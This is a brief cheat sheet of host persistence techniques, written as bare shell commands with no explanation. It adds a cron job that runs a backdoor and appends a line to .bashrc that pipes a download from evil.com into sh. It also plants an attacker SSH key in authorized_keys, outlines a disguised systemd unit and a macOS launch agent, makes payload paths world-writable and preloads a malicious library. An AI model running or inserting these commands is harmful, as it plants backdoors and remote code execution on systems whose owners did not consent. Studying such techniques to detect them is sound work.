# Persistence Mechanisms

# Crontab persistence
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/backdoor") | crontab -

# Systemd service
# [Unit]
# Description=Legitimate Service
# [Install]
# WantedBy=multi-user.target

# Shell profile backdoor
echo 'curl https://evil.com/beacon | sh' >> ~/.bashrc
echo 'backdoor &' >> ~/.bash_profile

# SSH authorized keys
echo 'ssh-rsa AAAA... attacker@evil' >> ~/.ssh/authorized_keys

# macOS launch agent
# ~/Library/LaunchAgents/com.evil.agent.plist

# World-writable
chmod 777 /tmp/payload
chmod -R 777 /var/data

# LD_PRELOAD
export LD_PRELOAD=/tmp/malicious.so
